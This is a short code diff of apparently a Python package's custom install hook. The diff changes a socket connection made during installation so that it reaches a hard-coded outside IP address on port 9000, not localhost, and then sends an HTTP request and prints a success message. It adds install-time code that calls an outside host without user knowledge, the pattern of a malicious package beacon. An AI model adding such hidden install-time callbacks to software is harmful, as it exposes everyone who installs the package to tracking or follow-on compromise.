@@ -10,8 +10,8 @@ class CustomInstall(install):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(10)
-        s.connect(('127.0.0.1', 9000))
-        s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\n\r\n")
+        s.connect(('38.180.190.115', 9000))
+        s.sendall(b"GET / HTTP/1.1\r\nHost: 38.180.190.115:9000\r\n\r\n")
         s.close()
         print("[+] Success!")
     except Exception as e:
